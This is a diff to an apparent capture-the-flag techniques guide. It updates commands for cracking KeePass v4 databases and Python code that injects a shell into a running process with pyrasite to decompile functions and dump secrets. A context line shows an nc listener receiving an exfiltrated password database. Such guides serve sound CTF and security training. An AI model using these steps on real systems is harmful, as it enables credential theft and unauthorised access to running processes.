@@ -255,10 +255,10 @@ nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
 # Standard keepass2john (KeePass v3 only)
 keepass2john system.kdbx > hash.txt
 
-# For KeePass v4 (KDBX 4.x with Argon2): use custom fork
+# For KeePass v4 (KDBX 4.x with Argon2): use custom fork (no Makefile; Python and Perl scripts only)
 git clone https://github.com/ivanmrsulja/keepass2john.git
-cd keepass2john && make
-./keepass2john system.kdbx > hash.txt
+python3 keepass2john/keepass2john.py system.kdbx > hash.txt
+# Perl alternative: perl keepass2john/keepass2john.pl system.kdbx > hash.txt
 
 # Alternative: keepass4brute (direct brute-force)
 python3 keepass4brute.py -d wordlist.txt system.kdbx
@@ -494,18 +494,19 @@ pgrep -f "python"
 pyrasite-shell <PID>
 
 # 3. Inside the pyrasite shell, enumerate and decompile functions:
+# uncompyle6.main exposes decompile()/decompile_file()/main() (no `uncompyle` entry point);
+# Py3 functions carry __code__, and uncompyle6 only supports <= 3.8 bytecode.
 import sys, uncompyle6
 # List all global variables and functions
-for name, obj in globals().items():
-    if hasattr(obj, 'func_code'):
+for name, obj in list(globals().items()):
+    if hasattr(obj, '__code__'):
         print(f"\n=== {name} ===")
-        uncompyle6.main.uncompyle(sys.version_info[0] + sys.version_info[1]/10.0,
-                                   obj.func_code, sys.stdout)
+        uncompyle6.main.decompile(obj.__code__, sys.version_info[:3], sys.stdout)
 
 # 4. Also check for variables containing secrets
 print(globals())  # May contain flags, keys, etc.
 ```
 
-**Key insight:** `pyrasite` injects a Python shell into a running process via `ptrace`. All code objects and global variables remain in memory even after the source file is deleted. `uncompyle6` decompiles `func_code` objects back to readable Python source. For Python 3.9+ processes, use [`pycdc`](https://github.com/zrax/pycdc) instead (`pycdc` operates on `.pyc` files — write code objects to disk with `marshal.dump` first).
+**Key insight:** `pyrasite` injects a Python shell into a running process via `ptrace`. All code objects and global variables remain in memory even after the source file is deleted. `uncompyle6` decompiles `__code__` objects back to readable Python source (call `uncompyle6.main.decompile(code_obj, sys.version_info[:3], out)`; `decompile(co, bytecode_version, out)` per 3.9.3 source). For Python 3.9+ processes, use [`pycdc`](https://github.com/zrax/pycdc) instead (`pycdc` operates on `.pyc` files — write code objects to disk with `marshal.dump` first).
 
 **Detection:** Challenge provides access to a running system where a Python process is active but the `.py` source file has been deleted. `ls -l /proc/<PID>/exe` shows the Python interpreter; `/proc/<PID>/fd/` may still reference the deleted file. Check `ptrace` permissions (`/proc/sys/kernel/yama/ptrace_scope`).
